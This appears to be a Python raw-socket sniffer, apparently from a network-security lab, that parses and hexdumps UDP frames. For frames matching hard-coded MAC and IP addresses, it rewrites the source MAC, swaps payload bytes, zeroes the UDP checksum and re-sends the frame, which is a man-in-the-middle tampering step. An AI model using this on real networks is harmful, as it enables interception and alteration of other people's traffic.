#!/usr/bin/env python3

# This program uses the hexdump module. Install it through pip (pip3 install
# hexdump) or download it at https://pypi.python.org/pypi/hexdump

import hexdump
import socket
import struct


def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind(("wlp57s0u1u3", 0))
    while True:
        frame, source = s.recvfrom(65565)
        eth_header_length, eth_src, eth_dst, eth_type, eth_payload = \
            parse_ethernet(frame)
        if eth_type != 0x0800:  # IP is type 0x0800
            print("Frame with ethernet type {} received; skipping...".format(
                eth_type))
            continue

        (ip_header_length, ip_total_length, ip_protocol, ip_src, ip_dst,
         ip_payload) = parse_ip(eth_payload)

        if ip_protocol != 17:  # UDP is protocol 17
            print("Packet with protocol nr. {} received; skipping...".format(
                ip_protocol))
            continue

        (udp_src_port, udp_dst_port, udp_data_length,
         udp_checksum, udp_payload) = parse_udp(ip_payload)

        print("Source (python): {}".format(source))
        print("Full frame:")
        hexdump.hexdump(frame)
        print("""\nEthernet:
    Src MAC: {} ({})
    Dst MAC: {} ({})
    Type:    {:#06x}""".format(bytes_to_mac(eth_src), eth_src,
                               bytes_to_mac(eth_dst), eth_dst,
                               eth_type))
        print("""IP:
    Header length: {}
    Total length:  {}
    Protocol:      {}
    Src address:   {}
    Dst address:   {}""".format(ip_header_length, ip_total_length,
                                ip_protocol, ip_src, ip_dst))
        print("""UDP:
    Src port:    {}
    Dst port:    {}
    Data length: {}
    Checksum:    {}""".format(udp_src_port, udp_dst_port, udp_data_length,
                              udp_checksum))
        print("Data:")
        hexdump.hexdump(udp_payload)
        print("\n\n")

        if (eth_src == b"\x00\x0f\xc9\x0c\xf7\x8c" and
                eth_dst == b"\x4e\x63\x9a\xcc\x5c\x8f" and
                ip_dst == "192.168.84.23"):
            # Replace source and dest MAC-addresses
            frame = b"\xc4\xe9\x84\xd7\x70\x67" + eth_dst + frame[12:]
            frame = frame.replace(b"XXXXXXXX", b"12345678")
#            frame = frame.replace(
#                bytes([udp_checksum // 256, udp_checksum % 256]),
#                b"\x00\x00")
            frame = frame[:eth_header_length + ip_header_length + 6] + \
                b"\x00\x00" + frame[eth_header_length + ip_header_length + 8:]
            s.send(frame)
            print("Forwarded frame")
            hexdump.hexdump(frame)


def bytes_to_mac(bytesmac):
    return ":".join("{:02x}".format(x) for x in bytesmac)


def parse_ethernet(frame):
    header_length = 14
    header = frame[:header_length]
    dst, src, type_code = struct.unpack("!6s6sH", header)
    if type_code == 0x8100:  # Encountered an 802.1Q tag, compensate.
        header_length = 18
        header = frame[:header_length]
        type_code = struct.unpack("!16xH", header)
    payload = frame[header_length:]
    return header_length, src, dst, type_code, payload


def parse_ip(packet):
    header_length_in_bytes = (packet[0] & 0x0F) * 4
    header = packet[:header_length_in_bytes]
    payload = packet[header_length_in_bytes:]
    (total_length, protocol, src, dst) = struct.unpack_from("!2xH5xB2x4s4s",
                                                            header)
    src = socket.inet_ntoa(src)
    dst = socket.inet_ntoa(dst)
    return header_length_in_bytes, total_length, protocol, src, dst, payload


def parse_udp(packet):
    header_length = 8
    header = packet[:header_length]
    payload = packet[header_length:]
    src_port, dst_port, data_length, checksum = struct.unpack("!HHHH", header)
    return src_port, dst_port, data_length, checksum, payload

if __name__ == "__main__":
    main()